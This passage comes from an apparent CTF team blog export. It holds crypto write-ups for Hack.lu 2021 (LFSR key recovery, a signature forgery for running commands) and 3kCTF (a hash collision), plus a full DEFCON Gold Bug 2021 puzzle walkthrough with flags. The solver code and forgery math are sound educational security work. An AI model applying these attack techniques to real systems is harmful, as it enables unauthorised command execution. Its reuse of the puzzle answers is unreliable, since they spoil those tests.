t_{384})$ with $t_1, t_2, ..., t_{384} \\in \\{0, 1\\}$ is generated.\nThe flag is encrypted bit-by-bit. The ciphertext of the $i$-th bit of the message, $m_i$, is defined by:\n\\[\\begin{cases} c_{i, 0} \u0026= (t_1 \\cdot p_1 + t_2 \\cdot p_2 + ... + t_{384} \\cdot p_{384})\\ \\text{mod}\\ q \\\\ c_{i, 1} \u0026= (t_1 \\cdot r_1 + t_2 \\cdot r_2 + ... + t_{384} \\cdot r_{384} + 8205m_i)\\ \\text{mod}\\ q \\end{cases}\\]\nAdditionally, after a bit is encrypted, the LFSR state is updated with\n\\[(t'_1, t'_2, ..., t'_{384}) := \\left(t_2, t_3, ..., \\text{NEXT}(t_1, t_2, ..., t_{384})\\right).\\]\nWe are given $(p_1, r_1), (p_2, r_2), ..., (p_{384}, r_{384})$ and encrypted flag $(c_{1,0}, c_{1,1}), (c_{2,0}, c_{2,1}), ...$. We are then able to access the decryption oracle. The goal is to recover the flag.\nSolution Denote $p_i = (p_{i, 1}, p_{i, 2}, ..., p_{i, 128})$ and $c_{k, 0} = (c_{k, 0, 1}, c_{k, 0, 2}, ..., c_{k, 0, 128})$ with $p_{i, j}, c_{k, 0, j} \\in \\mathbb{Z}_q$. Let's make $c_{1, 0, j}$ in terms of $p_{i, j}$'s:\n\\[c_{1, 0, j} = (t_1 \\cdot p_{1, j} + t_2 \\cdot p_{2, j} + ... + t_{384} \\cdot p_{384, j})\\ \\text{mod}\\ q.\\]\nNow we have 128 equations with unknowns $t_1, t_2, ..., t_{384}$. Denote\n\\[t_{k+385} := \\text{NEXT}(t_{k+1}, t_{k+2}, ..., t_{k+384})\\]\nfor $k \\geq 0$, then we have 384 equations when we consider $c_{2, 0, j}$, $c_{3, 0, j}$ and $c_{4, 0, j}$:\n\\[\\begin{aligned} c_{2, 0, j} = (t_2 \\cdot p_{1, j} + t_3 \\cdot p_{2, j} + ... + t_{385} \\cdot p_{384, j})\\ \\text{mod}\\ q, \\\\ c_{3, 0, j} = (t_3 \\cdot p_{1, j} + t_4 \\cdot p_{2, j} + ... + t_{386} \\cdot p_{384, j})\\ \\text{mod}\\ q, \\\\ c_{4, 0, j} = (t_4 \\cdot p_{1, j} + t_5 \\cdot p_{2, j} + ... + t_{387} \\cdot p_{384, j})\\ \\text{mod}\\ q. \\end{aligned}\\]\nSince we have 387 unknowns $(t_1, t_2, ..., t_{387})$ and 512 equations, we can recover $(t_1, t_2, ..., t_{387})$ by solving the linear system under modulo $q$. With that, we can substitute the unknowns to $c_{i, 1}$'s to recover the flag.\ndef lfsr(state): # x^384 + x^8 + x^7 + x^6 + x^4 + x^3 + x^2 + x + 1 mask = (1 \u0026lt;\u0026lt; 384) - (1 \u0026lt;\u0026lt; 377) + 1 newbit = bin(state \u0026amp; mask).count(\u0026#39;1\u0026#39;) \u0026amp; 1 return (state \u0026gt;\u0026gt; 1) | (newbit \u0026lt;\u0026lt; 383) # ============ q = 16411 Fq = GF(q) # sample.log includes a simple transcript connecting to the server. with open(\u0026#39;sample.log\u0026#39;) as f: lines = f.readlines() pk = eval(lines[1]) outputs = [] for line in lines[3:355]: outputs.append(eval(line)) A = Matrix(Fq, 512, 387) y = vector(Fq, 512) for i, (a, b) in enumerate(outputs[:4]): for j in range(128): A[128*i+j, :] = vector(Fq, [0 for _ in range(i)] + [pk[k][0][j] for k in range(384)] + [0 for _ in range(3-i)]) y[128*i+j] = a[j] x = A.solve_right(y) state1 = sum(int(x[i+0])\u0026lt;\u0026lt;i for i in range(384)) state2 = sum(int(x[i+1])\u0026lt;\u0026lt;i for i in range(384)) state3 = sum(int(x[i+2])\u0026lt;\u0026lt;i for i in range(384)) state4 = sum(int(x[i+3])\u0026lt;\u0026lt;i for i in range(384)) assert lfsr(state1) == state2 assert lfsr(state2) == state3 assert lfsr(state3) == state4 pk_right = [pk[k][1] for k in range(384)] state = state1 flag = 0 for (a, b) in outputs: flag *= 2 if (sum(pk_right[i] * ((state\u0026gt;\u0026gt;i) \u0026amp; 1) for i in range(384)) - b) % q != 0: flag += 1 state = lfsr(state) flag = int(flag) print(int.to_bytes(flag, len(outputs)//8, \u0026#39;big\u0026#39;)) WhatTheHecc ($198, 45 solves) Challenge Summary The challenge defines a signature algorithm $\\mathcal{S}$, where a key generated with elliptic curve parameter P-256 (the public and private keys are respectively $Q$ and $d$). The signing algorithm for a message $m$ is specified below ($\\text{H}$ is the SHA3-256 algorithm that returns an integer given an array of bytes):\n Compute $r = \\text{H}(m) \\cdot Q$ Compute $r' = r\\cdot d^{-1}\\ \\text{mod}\\ q$, where $q$ is the order of the curve Define $z = n_\\text{nonce} | t$, where $n_\\text{once} \\in [1, q)$ and $t$ is the timestamp in seconds Compute $R = r' + \\text{H}(z) \\cdot G$ Compute $s = [d - \\text{H}(z)]\\ \\text{mod}\\ q$ Return $(R, s)$ as the signature.  Also the verifying algorithm for a message $m$ and signature $(R, s)$:\n If $s = 0\\ \\text{or}\\ 1$ and $s \u0026gt; 0$ then the signature is considered invalid. The signature is valid only if  \\[s \\cdot G - Q + R = \\text{H}(m) \\cdot G\\]\nThere are three functions those we can use when connected to the server:\n [Show] Prints the public key. [Sign] Signs one of the four commands: id, uname, ls and date with $\\mathcal{S}$. [Run] Takes a signed command and executes if the signature is valid.  Solution The verify method they implemented is really fishy:\ndef verify(msg, sig, pub): R, s = sig # 👇 This is sus if s in [0,1,\u0026#39;\u0026#39;] and s \u0026gt; 0: return False tmp1 = s * pub._curve.G tmp2 = - pub.pointQ tmp3 = tmp2 + R return tmp1 + tmp3 == hash(msg) * pub._curve.G From the line specified, it seemed to me that $s$ should be nonzero. I tried putting $s = 0$ and found $R = Q + \\text{H}(m)$. That said, we can simply send $(R, s) = (Q + \\text{H}(m), 0)$ as an signature to execute arbitrary commands. With that said, we can simply craft a signature for cat flag and read the flag.\nPostmortem $\\mathcal{S}$ is not secure at all. It does not help even if $s \\neq 0$ is enforced. $R$ can be easily crafted given arbitrary $m$ and $s$:\n\\[R = [\\text{H}(m) - s] \\cdot G + Q\\]\nFor instance, @RBTree_ could execute arbitrary commands with $(R, s) = (Q, \\text{H}(m))$.\n","permalink":"https://b6a.black/posts/2021-11-04-hacklu-crypto/","summary":"Because there are not many Crypto listed in the \u0026quot;Stock Market\u0026quot;, I decided to join our \u003cdel\u003eWebb-expert\u003c/del\u003e Web-expert \u003cem\u003eOzetta\u003c/em\u003e for bounty hunting in web, and we got all web challenges done this time. The writeup of the web challenges can be found here.","title":"Hack.lu CTF 2021 Crypto Writeup"},{"content":"Banner credit: @CryptoVillage.\nWe played the annual Gold Bug puzzle hosted by the DEFCON Crypto and Privacy Village - and we won! Although we were unable to ace the challenge before the game ends, we managed to solve the remaining challenge afterwards. We will be covering all of them in this walkthrough.\nWe would like to express our gratitude to the puzzle setters: @MayaKaczorowski for filling in the steps those we missed in the write-up, and @0xCryptoK for bearing Mystiz's stupid questions during the game, too.\nBy the way, if we are talking about time, they are in UTC+8. We are 15 hours ahead of the Vegas time.\nPool of Tears Challenge Link\n Dear, dear! How queer everything is today! And yesterday things went on just as usual!\nI’ve made a real mess of things here. The lock and key were right in front of me, neatly packaged between near-centurions! But this world is so strange - dividing when we should have multiplied; combining when we should have counted! Oh what a mess this is.\n/ A71C3\n Solution ⌛ Progress: 1/11 ⌛\n🎉 Solved on August 7, 03:55 (2h 55m after the game starts) 🎉 There are multiple lines of floating point number. We threw their decimal parts to WolframAlpha. These are multiple examples:\n\n\nWe are awared that the denominators are factors of 684483. We then tried to multiply each number by 684483:\n99242120222107240109211806120025211019050912221525219900000000000000000 99251913102109211510092505012022041421171509990000000 991720010821080801092103241211050922071014020615252199000000000000000000000000 99052002141105151416021002062516171906990000000000000000000 992421202114182125071118091714180912060325170713052521990000000 9924212006111410190009221523071724162019182415259900000000000000 991720011511251922142118061200252113100914021115019900000000000000000 991315170013180401131525100118220414111703169900000000 99152118141119050215200005232214021217112213179900 TWY counted the trailing zeros from each line and obtained 17, 7, 24, 19, 7, 14, 17, 8, 2, which is rhythoric. However, this is not the flag. On the other hand, Mystiz grouped the numbers between the two 99s into pairs. For example, for the first line it is\n24 21 20 22 21 07 24 01 09 21 18 06 12 00 25 21 10 19 05 09 12 22 15 25 21 This is decoded YVUWVHYBJVSGMAZVKTFJMWPZV. What does that mean?\nEventually, we figured out we can use Vigenere cipher to decrypt YVUW... with the key rhythoric and obtained those lines:\nhowdoththelittlecrocodile improvehisshiningtail andpourthewatersofthenile oneverygoldenscale howcheerfullyheseemstogrin howneatlyspreadhisclaws andwelcomelittlefishesin withgentlysmilingjaws youvefoundthepalepuppy Flag: palepuppy\nPostmortem. A71C3 is 684483 in base 16. We did not notice it at all\u0026hellip;  Wonder Watch Challenge Link\nSolution ⌛ Progress: 2/11 ⌛\n🎉 Solved on August 7, 04:15 (3h 15m after the game starts) 🎉 TWY read the clock's hands, which is 18days 1hour 33minutes 25seconds 286/1000 250/1000 791/1000. Since it mentions 1GHz, the time should be correct to one nanosecond, which is what we have now. When converted to a number, it is 1560805286250791.\nMystiz tried to convert the number in base 26 and 256 but did not have a proper result. However, noticing the SemiSeptemvigesimal in the clock, he converted the number into base 27 (7 15 18 9 14 7 0 7 15 1 20). By mapping 0 to the space and the rest to the English alphabet, we got the flag.\n❓ Question. What does Semi mean in SemiSeptemvigesimal?  Flag: goringgoat\nPig and Pepper Challenge Link\n \u0026quot;By-the-bye, what became of the baby?\u0026quot; said the Cat. \u0026quot;I'd nearly forgotten to ask.\u0026quot;\n\u0026quot;It turned into a pig,\u0026quot; Alice quietly said, just as if it had come back in a natural way.\n\u0026quot;Did you say pig, or fig?\u0026quot; said the Cat.\n\u0026quot;I said pig,\u0026quot; replied Alice.\n Solution ⌛ Progress: 3/11 ⌛\n🎉 Solved on August 7, 23:55 (22h 55m after the game starts) 🎉 It is pretty obvious that pigpen cipher is the first stage.\nhadr range corn eek ream live heat 💬 Puzzle Setter\u0026rsquo;s Comment. We published an errata a few hours into the hunt that the first word should swap the third and fourth letters to get a valid word.  However, the words eek, ream did not make any sense. Maybe it is eel or team? Turns out we can build a food name by adding one character in front:\nC hadr O range A corn L eek C ream O live W heat Flag: coalcow\nCaucus-race Challenge Link\n \u0026quot;What is a Caucus-race?\u0026quot; said Alice. \u0026quot;Why,\u0026quot; said the Dodo, \u0026quot;the best way to explain it is to do it.\u0026quot;\nFirst it marked out a race-course, in a sort of circle, (\u0026quot;the exact shape doesn’t matter,\u0026quot; it said,) and then all the party were placed along the course, here and there. There was no \u0026quot;One, two, three, and away,\u0026quot; but they began running when they liked, and left off when they liked, so that it was not easy to know when the race was over.\n Solution ⌛ Progress: 4/11 ⌛\n🎉 Solved on August 8, 00:10 (23 10m after the game starts) 🎉 🤔 Unintended? TWY saw hidden text inside the PDF which had most of the below steps.  Approach:\n Exhaust possible plaintexts encrypted with Caesar cipher. For example, JHQVHQVSLNHFRKHQMRMRU -\u0026gt; GENSENSPIKECOHENJOJOR. Shift the string into the correct order. For example, GENSENSPIKECOHENJOJOR -\u0026gt; JOJORGENSENSPIKECOHEN (JO JORGENSEN / SPIKE COHEN). Find their party (Libertarian Party) and capture the first letter (L) Repeat for each of the cases  Libertarian Party -- JO JORGENSEN, SPIKE COHEN Caesar shift +3 JHQVHQVSLNHFRKHQMRMRU Independent Party of Oregon -- CLIFF THOMASON, PATRICK BARNEY Caesar shift +8 JIZVMGKTQNNBPWUIAWVXIBZQKS Oregon Progressive Party -- DARIO HUNTER, CHRIS HENRY +15 XHWTCGNSPGXDWJCITGRWG New Progressive Party -- RICARDO ROSSELLO, JENNIFFER GONZALEZ +13 SRETBAMNYRMEVPNEQBEBFFRYYBWRAAVS Alliance Party -- ROCKY DE LA FUENTE, DARCY RICHARDSON Caesar shift +5 ZJSYJIFWHDWNHMFWIXTSWTHPDIJQFK Legal Marijuana Now Party -- DAN VACEK, MARK ELWORTH +17 TVBDRIBVCNFIKYUREMR Opposition Party -- WILLIAM NH SMITH, FRANCIS BRISTOW +7 TUOZTPAOMYHUJPZIYPZAVDDPSSPH Freedom Socialist Party -- STEPHEN DURHAM, CHRISTINA LOPEZ +22 DWIYDNEOPEJWHKLAVOPALDAJZQN Transhumanist Party -- CHARLIE KAM, LIZ PARRISH +20 UGFCTJULLCMBWBULFCYE We have the flag when taking the first character from the parties.\n💬 Puzzle Setter\u0026rsquo;s Comment. This is one of the few puzzles that had some extra content that wasn\u0026rsquo;t used. The Caesar shift and the shift in start of the text were not used for anything. In retrospect, I probably should have used these to spell out \u0026ldquo;RED HERRING\u0026rdquo; or something like that.  Flag: lionaloft\nSide Story. There is a little detour when we parse the flag. Mystiz thought it was liona loft while Ozetta corrected that it should be lion aloft.  Split Meanings Challenge Link\n I stumbled upon the most peculiar coincidence. Or was it a coin cidence? Or a Coinci dence??\nOnce you've separated heads from tails, don't forget to use the passages for spot all-stars... or was it a result of points...\n Solution ⌛ Progress: 5/11 ⌛\n🎉 Solved on August 8, 00:55 (23h 55m after the game starts) 🎉 We had no idea what was going on. Mystiz guessed that the first hint starts with dig because of the word excavating. TWY thought that should be digest, and eventually got the first solution: dig estate / digest ate.\nOn the second trial, TWY suggested that the last one ends with terrain.\n Mystiz: win terrain / winter rain? TWY: bet terrain / better rain!\n We eventually solved most of them. While we are solving, assuming that the middle part consists of three letters also helped us to solve the harder ones:\nRatio of law enforcement OR a penny (10) cop percent / copper cent In addition to nature OR having no exit (12) with outdoors / without doors [*] Island of a large island OR location for work (10) off iceland / office land [*] Jewelry for phone icons OR suddenly visible circles (11) app earrings / appear rings Alice’s vote OR a bundle of rosemary (9) her ballot / herbal lot Planter for particles OR spud speaking device (9) pot atomic / potato mic Expert demonstration OR correct posture (10) pro perform / proper form Excavating an inheritance OR consuming an processing (9) dig estate / digest ate Tasting tin OR master of the shiny elements (12) metal licking / metallic king Laws pertaining to a flying mammal OR a night out with the caped crusader (10) bat mandate / batman date Gambling field OR more welcome precipitation (10) bet terrain / better rain [*]: Answers provided by the puzzle setter. There are a bunch of unused triples. For that, we extract the three letters in the middle part and compute a product-sum for each of the triples.\nFor the first line, the middletext is per (that is $(16, 5, 18)$) and the triple is $(-2, 1, 2)$. We can compute i (which is a $9$) with the below formula:\n\\[(-2)\\cdot 16 + 1\\cdot 5 + 2\\cdot 18 = 9\\]\nRepeating the progress, we had the flag.\nFlag: ivoryequine (so the adjective and the noun doesn't start with the same letter)\nInconvenient Habit of Kittens Challenge Link\nSolution ⌛ Progress: 6/11 ⌛\n🎉 Solved on August 8, 04:15 (1d 3h 15m after the game starts) 🎉 We are given a sound file of meow's and purr's, some follows immediately after the previous sound, some with a short pause and some with a longer pause.\nWe first labelled and converted the sound file into the following text:\nr h atfd k@el !w b xig oc sj pu vhaf mdk el qbi zgn$ #yr oct @ jp! vwh xa s umq fdke lbz n$ i#yg r to@! wcj pvx su hmqa z nf$# dkyrel bt @i goc j!w p vxh sumafd kelb qzn i$g #o c yjp vhaf rt@ d!k elb i The maximum length is 6 and there are more than 26 different source of sounds.\n\nOkay, this is some sort of morse code. When we convert each purr into a dash and each meow into a dot, we are able to get:\n- . .-.. .-.. -- . -.. .. -. .- .... -.. .. -.. -.-- --- ..- - ..- .-. -. - --- .... ..- -- .--. - -.-- -.. ..- -- .--. - -.-- ..--.. .- -. ... .-- . .-. ---... .... --- .-. -. . -.. .... --- .-. ... . Actually we have only converted the last line before solving it, since that word looks like the answer.  TELL ME DINAH DID YOU TURN TO HUMPTY DUMPTY? ANSWER: HORNEDHORSE\nFlag: hornedhorse\nDown the Rabbithole Challenge Link\nSolution ⌛ Progress: 7/11 ⌛\n🎉 Solved on August 8, 13:55 (1d 12h 55m after the game starts) 🎉 Stage 1  Have you come seeking the Jabberwock? Beware - there is danger ahead!\nWe must first go DANCING down the rabbit hole...\n This stage is pretty straight-forward. Decoding with dancing-man cipher, we can see that there are two group of words: blue and caterpillar. Thus the answer is BlueCaterpillar.\n\nStage 2  Twas brillig, and the slithy toves Did gyre and gimble in the wabe; All mimsy were the borogoves, And the mome raths outgrabe.\n There are a bunch of lines sampled below. After a bit of researching, it seems that each line represents an area code in the United States or Canada.\n(Boulder, CO [historically]), (Fresno, CA), 110, 148, (Asheville, NC), ... Also, 303 Duovigintillion in the title hinted that we are going to build a big number eventually. Also, the line \u0026quot;After all, you wouldn't want to waste your PRIME FORM.\u0026quot; suggested us to factorize the numbers.\nWith the help of Google and the area code checker, we can build a huge number.\n\\[303559110...132800000 = 2^{20}\\cdot3^8\\cdot5^5\\cdot7^{18}\\cdot11^{15}\\cdot13^{19}\\cdot17^5.\\]\nConsidering the indices in the prime factorization, we got the answer for the next stage: TheRose.\nStage 3  Beware the Jabberwock, my son! The jaws that bite, the claws that catch! Beware the Jubjub bird, and shun The frumious Bandersnatch!\n \nThis stage is also easy. Searching the keywords dark, jot and cipher on Google, we are suggested that the above text is encoded in nyctography, created by Lewis Carroll.\n\nDecoding the text, we have the answer CheshireCat.\n😏 An Insight. Mystiz realised that these are all characters in the Alice in the Wonderland now\u0026hellip;  Stage 4  He took his vorpal sword in hand: Long time the manxome foe he sought - So rested he by the Tumtum tree, And stood awhile in thought.\n \nWe can see that there are a bunch of M\u0026amp;Ms in this stage. Similar to Knave of Hearts (which is not correct), Mystiz thought that it is ASCII related because there are eight columns and first column consists of zeroes only. This decodes into CountColors, and therefore the number of M\u0026amp;Ms are counted for each of the colors.\nwhite: 16 (p) red: 20 (t) pale-red: 3 (c) orange: 8 (h) yellow: 5 (e) green: 4 (d) blue: 21 (u) brown: 11 (k) ---------------- sum: 88 Mystiz tried to anagram with ptcheduk. Got peck thud but it was not helpful.\n\nTWY found that white is a stub and p should not be included. Rearranging the characters, it should be TheDuck.\nStage 5  And as in uffish thought he stood, The Jabberwock, with eyes of flame, Came whiffling through the tulgey wood, And burbled as it came!\n \nWe are given a lint of runes. It is easily searchable that the characters are Elder Futhark. When decoded, we have the below message:\nᛊᛖᚲ ᛃᛖ ᚦᛖ ᛞᚱᛁᛒᚢᚱ ᛟᚠ ᚾᚨᛃᛚ ᚨᚾᛞ ᛊᛈᛚᛁᛏᛏᚢᚱ ᛟᚠ ᚹᚢᛞ sek je þe dribur of najl and splittur of wud TWY parsed the line a bit and got driver of nail and splitter of wood. With that, Mystiz went through the characters and found Carpenter is the perfect match (he also found hammer bird but it was incorrect).\nUncertain bits. Mystiz thought sek je þe to be seek me the.  Stage 6  One, two! One, two! And through and through The vorpal blade went snicker-snack! He left it dead, and with its head He went galumphing back.\n This is the final stage but Mystiz had no idea how to craft the key. Ozetta suggested that the solution is a ten-letter word and asked if Mystiz is going to brute force the solution.\n Ozetta: Are you going to brute force the solution with a dictionary yet? Mystiz: How even do I brute force a ten-letter word?\n*tries wonderland with instinct*\n\u0026quot;And, has thou slain the Jabberwock?\u0026quot;\n The Jabberwock is slained, and RubyReptile is sitting inside the source code.\nFlag: rubyreptile\nLobster Quadrille Challenge Link\n \u0026quot;You may not have lived much under the sea so you can have no idea what a delightful thing a Lobster Quadrille is!\u0026quot; \u0026quot;No, indeed,\u0026quot; said Alice. \u0026quot;What sort of a dance is it?\u0026quot; \u0026quot;Why,\u0026quot; said the Gryphon, \u0026quot;you ﬁrst form into a line along the sea-shore—\u0026quot; \u0026quot;Two lines!\u0026quot; cried the Mock Turtle.\n Solution ⌛ Progress: 8/11 ⌛\n🎉 Solved on August 8, 15:35 (1d 14h 35m after the game starts) 🎉 We are given pictures of five ocean animals. Assuming that the lengths given on the left are correct, then they are respectively haddock, squid, quahog, shrimp and king crab.\n💬 Puzzle Setter\u0026rsquo;s Comment. This is the sea animal people had the hardest time identifying. We tweeted a hint, \u0026ldquo;My third is hard shelled\u0026rdquo;, to help with that.  There is a line UEHKYHRIOSTEETEMDR on the very bottom. Using railfence cipher with two rows. It decrypts into USE THE KEY THERMIDOR. The rationale comes from the challenge statement - \u0026quot;Two lines!\u0026quot; cried the Mock Turtle.\nIn a later time, there is a hint regarding to the remaining part of the puzzle:\n\nMystiz identified that might be playfair cipher. However he was unsure what to decrypt (or encrypt). He decided to DM the puzzle writer and received:\n CryptoK — 2021/08/08\ntrust your intuition a bit more there\n Mystiz decided to look into playfair cipher. He initially thought the seven-letter word that ends with a T would be decrypted to haddock. This led him nowhere.\n\nAfter reassured by the puzzle writer, he tried to decrypt the pairs. For instance, we are using the seventh letter of haddock, i.e. K, along with the hint T. When it is decrypted with the key THERMIDOR, we have CR. The seventh letter of haddock is picked because T in the hint is the seventh letter.\nRepeating the process with the ciphertext pairs KT, DX, QT, IF, IR. We have CR OW NE DC AT.\nFlag: crownedcat\nKnave of Hearts Challenge Link\n Then followed the Knave of Hearts, carrying the King's crown on a crimson velvet cushion; and, last of all this grand procession, came The King and Queen of Hearts.\nAlice was rather doubtful whether she ought not to lie down on her face like the three gardeners, \u0026quot;and besides, what would be the use of a procession,\u0026quot; thought she, \u0026quot;if people had all to lie down upon their faces, so that they couldn’t see it?\u0026quot;\n Solution ⌛ Progress: 9/11 ⌛\n🎉 Solved on August 9, 00:20 (1d 23h 20m after the game starts) 🎉 It is pretty evident that there are two puzzles on the board: Nonogram and sudoku. This is what we have after filling in the board:\n\nNote that there are multiple solutions for the nonogram. We marked them in pale orange and light blue - and either one serves as part of the correct answer along with the green squares.\nAfter that, we are long stuck. There are three hints released:\n If the Knave told you that he could feel the next step by closing his eyes, would you believe him? The knave's friend can move from his starting position to the opposite corner clockwise. Consider the unseen and the derived separately. From there, your journey continues where edges meet.  There are some thoughts while we are stuck. For instance, we think the the solution for nonogram is encoding ASCII characters column-by-column (which reads 5 53R1C#). We also guessed that each column is encoding a pair of coordinates (which decodes to $(3, 5)$, $(2, 0)$, $(3, 5)$, $(3, 3)$, ...). Unfortunately this led us to nowhere.\nBecause of the desperation, Mystiz DMed for hints once again and knew it was braille immediately:\n CryptoK — Aug 8 How might one read if they are wearing a blindfold?\n Decoding the nonogram solution with Braille, we obtained knightne (the another one does not decode into something meaningful).\n💬 Puzzle Setter\u0026rsquo;s Comment. This was also clued in the passage from Alice in Wonderland, \u0026ldquo;so that they couldn\u0026rsquo;t see it\u0026rdquo;.  It is stated from the second hint that the knight can move from one corner to the opposite clockwise. Which corners? What are the walkable squares?\nEventually, when we assume that the obstacles are defined by the given hints in sudoku, we are able to move from top-right to bottom-left clockwise. The squares form the flag.\n\nFlag: avianally\nHoofman's Headache Challenge Link\n When given a series of digits,\nI can’t help but begin to fidget.\nMy mind can’t stay still,\nWhile counting the quill\nOf characters expected within it.\nAnd what of the text? Wonder through and reflect?\nAnd the form you have sought? Left be less yielding naught?\nHoofman's thoughts can’t see why one would want to multiply!?\nLeft and right form anew, but their sums over-grew??\nThat’s optimally not right when compressing.\n Solution ⌛ Progress: 10/11 ⌛\n🎉 Solved on August 9, 01:50 (2d 50m after the game starts) 🎉 We are given 266 bits as below:\n00100101110111101110011110101111101111 10110110110001001010101001111000001101 01000111101001111010110000001010100010 11010110011000101101100100000110000010 01101111111001101101011001011000101101 01111100100111110111100101000010011011 10110110011010100011011011001000000110 From the title we notice that Hoofman is spelt so similar to Huffman, especially when the letter o is considered a wildcard character. \u0026quot;Compress\u0026quot; appears in the last line, that further validates this assumption. Furthermore, we made some assumptions according to the poem regarding the \u0026quot;special\u0026quot; construction of the tree:\n \u0026quot;While counting the quill of characters expected within it\u0026quot; may be related to the letter frequencies \u0026quot;Left be less yielding naught\u0026quot; seems to imply that the left branch of the tree has smaller weight than the right branch, and the assigned bit is 0. \u0026quot;Hoofman's thoughts can’t see why one would want to multiply!?\u0026quot; seems to imply that multiply is used instead of addition. \u0026quot;Left and right form anew, but their sums over-grew??\u0026quot; is the basic concept of Huffman tree, and \u0026quot;over-grew\u0026quot; emphasizes the growth rate of the weight after merging. \u0026quot;That's optimally not right when compressing.\u0026quot; implies that the implementation is different from the optimal Huffman tree construction.  There are some more questions regarding to the third point. If we are using multiplication instead of addition, we need to consider whether \u0026quot;the quill\u0026quot; means the count or the percentage. If it is the latter case, then multiplying two numbers should result in a smaller fraction, so we should instead take the two nodes with highest weights (We thought of whether \u0026quot;Wonder through and reflect?\u0026quot; is related). Otherwise, if it is the frequency, then the actual length of the source is important since when the length is doubled, the product of two weights will become 4 times the original, that affects the relative weight of nodes between different levels.\nSince guessing the correct source is difficult, we drafted the script for building Huffman tree and wait for hints. The script consists of replacable components:\n changeable source extracting the heaviest or the lightest node using fraction to store the frequency (denominator is 1 for integers) whether to use multiplication or addition  We used the Relative frequency in the English text at the moment, but we were uncertain about whether spaces and symbols should be included, and whether to treat capital and small letters separately.\nEventually the challenge author released the first hint:\n\nFrom this we know that the source should not be that relative frequency, but some pieces related to Alice in Wonderland. Following that, they released the next hint:\n\nThis proves our assumption, and we are certain that frequencies (instead of percentages) of letters is used. Also, this confirms that minimum weights is used, and multiplication is used for the new node.\nHere we start to think what the source the frequencies are taken from. We tried to use the letter frequencies from Alice in the Wonderland, and obtained the below \u0026quot;plaintext\u0026quot;:\nOJCCAUNQYLIOMAGAZAUQJHOFJJAIEWHEHPQDLJOGYCWARDFOERYEFELOHE Although all bits are consumed (We can immediately falsify a tree if there are leftover bits), the text looked nonsense. Eventually another hint comes in to the scene:\n\nThe paste is entitled HoofmansSourceText, and the contents comes from \u0026quot;Through the Looking-Glass, and What Alice Found There\u0026quot;, which is considered the sequel to Alice's Adventures in Wonderland. We replaced the current text with the given text, and obtained the below plaintext:\nITLLPUZZLEITTOGOTHROUGHTHECEILINGIEXPECTKEYWORDFIERCEFELINE (It'll puzzle it to go through the ceiling I expect keyword fierce feline)\nFlag: fiercefeline\nPostmortem. It seems that \u0026ldquo;Wonder through and reflect\u0026rdquo; indicates the text used. That is, Through the Looking-Glass.  Mom's Monsters (Meta) Challenge Link\n White, Red, or Hearts they be, Connect the dots and you will see. Monsters ten have come to pray - Name them well and we shall play.\n Solution ⌛ Progress: 11/11 ⌛\n🎉 Solved on August 9, 20:00 (15h 30m after the game ends) 🎉 There are two hints released. And the first being:\n\n❓ Question. What exactly is this?  The second one is relatively direct.\n\nThe capital letters form the word UKMINT, which may refer to the royal mint (the government-owned mint in the United Kingdom). They recently produced the coin for Alice in Wonderland. More importantly, they also produced the coin featuring the Queen's Beasts:\n\nWhy is the riddle related to the Queen's Beasts? Here is the list of the beasts:\n The Lion of England The White Greyhound of Richmond The Yale of Beaufort The Red Dragon of Wales The White Horse of Hanover The White Lion of Mortimer The Unicorn of Scotland The Griffin of Edward III The Black Bull of Clarence The Falcon of the Plantagenets  We can see that each of the ten flags corresponds to a beast. This is the mapping between the two:\n Fierce Feline - The White Lion of Mortimer Pale Puppy - The White Greyhound of Richmond Goring Goat - The Yale of Beaufort Crowned Cat - The Lion of England Avian Ally - The Falcon of the Plantagenets Lion Aloft - The Griffin of Edward III Ruby Reptile - The Red Dragon of Wales Coal Cow - The Black Bull of Clarence Horned Horse - The Unicorn of Scotland Ivory Equine - The White Horse of Hanover  \n❓ Another Question. How to obtain the flag?  Well, the only clue left is the graph in the challenge pdf. At first glance, we should be able to conclude that the shape represents its corresponding beast's name by the puzzle index.\nHow about the x-axis? We can notice that there is only one shape per x-value, so it is having high chance that it is the character index of the meta-puzzle's flag.\nFinally, the y-axis then must be the character index of the corresponding beast's name. As the least y-index starts from 4, we can guess that all the beasts' name included the word \u0026quot;The\u0026quot;. Besides, there should be no spaces for the beasts' name as from the experence in previous challenges.\nFollowing the idea, we have the string below:\niFYouLlBEaieveinmeIllBelieveinyou There is one incorrect point (10, 18) which should be instead (10, 17). Fixing it, we have the final answer:\nifyoullbelieveinmeillbelieveinyou Which is, \u0026quot;If you'll believe in me, I'll believe in you\u0026quot;.\n","permalink":"https://b6a.black/posts/2021-08-19-defcon-gold-bug/","summary":"We played the annual Gold Bug puzzle hosted by the DEFCON Crypto and Privacy Village - and we won! Although we were unable to ace the challenge before the game ends, we managed to solve the remaining challenge afterwards. We will be covering all of them in this walkthrough.","title":"DEFCON Gold Bug Puzzle 2021"},{"content":"\nWe are united to play 3kCTF-2021 and result in the second place. In this blog post, we will walk through our solutions on the challenges solved.\nSMS (Crypto; 435 points) Solved by Mystiz.\nWe are given a hash algorithm called SMS. The algorithm itself is simple:\ndef hash(data): assert len(data) % 8 == 0 state = [2**i-1 for i in range(1, 9)] for i in range(0, len(data), 8): block = data[i: i+8] state = sub(state) state = mix(block, state) state = shift(state) state = sub(state) return bytes(state).hex() The goal is to find a pair of inputs such that both digests are 00 00 00 00 00 00 00 00. Also, the sub, mix and shift methods are short:\ndef sub(state): return [SBOX[x] for x in state] def mix(block, state): for i in range(8): state[i] ^= block[7 - i] \u0026amp; 0x1f state[i] ^= block[i] \u0026amp; 0xe0 return state def shift(state): t = 0 for s in state: t ^= s u = state[0] for i in range(7): state[i] ^= t ^ state[i] ^ state[i+1] state[7] ^= t ^ state[7] ^ u return state We can implement the inverse functions for sub and shift (i.e., unsub and unshift) easily. With that said, we are able to recover a 8-byte input block with the below recover_payload, given the input and output states:\n# Find the 8-byte input block such that s -\u0026gt; t after one round of SMS def recover_payload(s, t): # t = shift(mix(x, sub(s))), where x is the input u = sub(s[:]) v = unshift(t[:]) # v = mix(x, u) x = [0 for _ in range(8)] for i in range(8): x[ i] ^= (u[i] ^ v[i]) \u0026amp; 0xe0 x[7-i] ^= (u[i] ^ v[i]) \u0026amp; 0x1f return x With the above function, it is not difficult to find a pair of messages such that they both hash to eight null bytes:\nt = unsub([0 for _ in range(8)]) x1 = recover_payload([1, 3, 7, 15, 31, 63, 127, 255], t) # x1 = 1d 3f 42 28 3b 54 3c db x2 = recover_payload([1, 3, 7, 15, 31, 63, 127, 255], [0, 0, 0, 0, 0, 0, 0, 0]) + \\ recover_payload([0, 0, 0, 0, 0, 0, 0, 0], t) # x2 